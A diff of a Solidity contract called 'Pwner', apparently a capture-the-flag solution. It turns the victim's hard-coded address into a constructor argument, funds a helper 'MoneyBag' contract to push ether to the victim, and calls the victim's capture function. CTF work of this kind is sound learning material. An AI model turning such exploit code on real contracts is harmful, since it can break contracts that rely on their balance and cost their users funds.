@@ -35,10 +35,10 @@ contract MoneyBag {
 //The PWNer:
 //*remember to send 1 wei when deploying
 contract Pwner {
-    address payable public constant victimsAddress = 0xCe179b2c7986C05846ADfCAfC687de7898CeD6D5;
+    //0xCe179b2c7986C05846ADfCAfC687de7898CeD6D5 is the contract I'll pwn this time
     Flag public victim;
     
-    constructor() public payable {
+    constructor(address payable victimsAddress) public payable {
         (new MoneyBag).value(msg.value)(victimsAddress);
         victim = Flag(victimsAddress);
         victim.capture("AYBABTU");
